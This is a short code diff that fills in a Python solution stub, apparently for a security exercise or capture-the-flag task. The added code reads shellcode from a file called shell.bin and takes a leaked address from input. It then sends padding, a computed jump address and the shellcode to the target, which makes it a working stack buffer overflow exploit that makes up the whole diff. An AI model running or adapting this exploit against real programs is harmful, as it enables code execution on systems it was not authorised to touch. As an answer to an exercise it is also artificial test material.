@@ -26,4 +26,15 @@ def eprint(*args, **kwargs):
     print(*args, file=sys.stderr, **kwargs)
 
 # TODO: Implement your solution here.
-
+data = ""
+with open('shell.bin', 'rb') as file:
+    data = file.read()
+    
+main_adress = int(sys.stdin.readline(), 16)
+offset = 128
+adress_to_jump = main_adress - offset
+writeStr('T'*40)
+writeLong(adress_to_jump)
+writeStr("\n")
+writeBytes(data)
+writeStr("\n")
